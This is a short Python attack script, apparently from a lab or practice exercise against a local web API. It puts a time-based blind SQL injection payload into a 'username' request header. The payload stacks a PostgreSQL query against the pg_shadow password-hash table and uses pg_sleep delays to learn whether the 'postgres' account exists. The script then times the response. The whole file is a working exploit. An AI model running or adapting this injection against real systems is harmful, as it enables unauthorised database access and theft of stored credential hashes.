# looking at operator user data

import requests
import time

url = "http://127.0.0.1:3000/api/user"

# passwd = "..." <- sha256 hashed pwd
sqlinjected_text = "Hans'; SELECT CASE WHEN (usename = 'postgres') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM pg_shadow--"

headers = {
    'username': sqlinjected_text,
}

startTime = time.time()
response = requests.request("GET", url, headers=headers)
executionTime = (time.time() - startTime)
print('Execution time in seconds: ' + str(executionTime))
print(response.text)
